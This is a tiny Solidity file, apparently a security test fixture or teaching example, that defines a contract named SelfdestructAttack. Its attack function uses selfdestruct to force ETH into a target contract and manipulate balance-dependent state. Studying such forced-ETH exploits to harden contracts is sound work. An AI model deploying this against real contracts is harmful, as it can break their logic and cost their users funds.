// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SelfdestructAttack
 * @notice Attack contract using selfdestruct
 * @dev Force ETH into target to manipulate state
 */
contract SelfdestructAttack {
    function attack(address target) external payable {
        selfdestruct(payable(target));
    }
}
